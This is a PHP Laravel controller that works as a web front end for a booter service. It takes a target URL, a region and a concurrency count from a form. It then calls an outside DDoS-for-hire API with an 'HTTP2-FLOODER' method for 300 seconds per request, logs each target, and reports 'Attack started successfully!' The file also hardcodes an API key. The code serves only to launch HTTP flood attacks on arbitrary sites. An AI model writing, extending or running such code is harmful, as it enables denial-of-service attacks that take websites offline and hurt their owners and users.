<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use App\Models\History;
use Illuminate\Support\Facades\DB;

class FlooderController extends Controller
{
    public function index()
    {
        return view('flooder.index');
    }

    public function submit(Request $request)
    {
        $request->validate([
            'host' => 'required|string|url',
            'geo' => 'required|string',
            'concurrents' => 'required|string', 
        ]);

        $host = $request->input('host');
        $geo = $request->input('geo');
        $concurrents = (int) $request->input('concurrents'); 
        $apiKey = 'f716e197-43942b79-6b3bbb8a-9f56ad44';
        $time = 300;

        $responses = []; 

        $insertData = [];

        for ($i = 0; $i < $concurrents; $i++) {
            $insertData[] = [
                'host' => $host,
                'executed_at' => now(),
            ];

            $response = $this->sendPostRequest($host, $apiKey, $time, $geo);

            if ($response) {
                $responses[] = $response;
            } else {
                $responses[] = ['error' => 'Request failed for iteration ' . ($i + 1)]; 
            }
        }

        DB::table('history')->insert($insertData);

        session(['api_response' => end($responses)]);
        session()->flash('success', 'Attack started successfully!'); 
        
        return response()->json($responses);
    }
    
    private function sendPostRequest($host, $apiKey, $time, $geo)
    {
        $url = "https://flooder.su/API/l7";
        $params = [
            'api_key' => $apiKey,
            'host' => $host,
            'time' => $time,
            'method' => 'HTTP2-FLOODER',
            'rmethod' => 'GET',
            'data' => '',
            'header' => 'GET',
            'request' => '50',
            'geo' => $geo,
            'concurrents' => '1', 
        ];

        $response = Http::post($url, $params);

        if ($response->successful()) {
            return $response->json(); // Return the response for each call
        } else {
            // Handle the error case
            return [
                'error' => 'Failed to send request',
                'status' => $response->status(),
                'message' => $response->body(),
            ];
        }
    }
}
